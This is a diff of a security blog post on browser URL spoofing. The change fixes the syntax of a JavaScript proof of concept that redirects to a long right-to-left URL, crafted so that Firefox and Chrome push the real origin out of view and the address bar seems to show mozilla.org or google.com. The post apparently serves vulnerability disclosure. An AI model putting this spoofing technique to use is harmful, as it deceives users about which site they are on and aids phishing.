@@ -29,7 +29,7 @@ Furthermore, another interesting URL-spoofing issue I've encountered during some
 
 And as obvious as it seems, neither of Firefox nor Chrome handle such a long RTL-aligned URL properly, resulting in getting the real origin shifted away into the right corner of the navigation bar! Here's a simple PoC code:
 {% highlight javascript linenos %}
-(function {
+(function() {
     location.href = (/firefox/i.test(navigator.userAgent)) ? 'http://www.example.com/https://www.mozilla.org/XxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxXXXXXxxxxxxxxxxxxxxxxXXXxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxXxxxxxxxxXxxxxxUUxxxxxxxxxxxxx' : 'http://example.com/dd/%D8%A7%D8%A7%D8%A7zzzzzz%D8%A7%D8%A7%D8%A7%D8%A7%D8%A7Spoofedzzz%D8%A7zxzlllzzzzxzzzllSpoofedSpoofedSpoofHASHSpoofedspoofzzz%D8%A7%D8%A7%D8%A7%D8%A7zzz%D8%A7%D8%A7%D8%A7Hashlz%D8%A7%D8%A7Spoofed/Spoofed.php?query=xxHASHspoofzz%D8%A7l%D8%A7/https://www.google.com';
 }());
 {% endhighlight %}
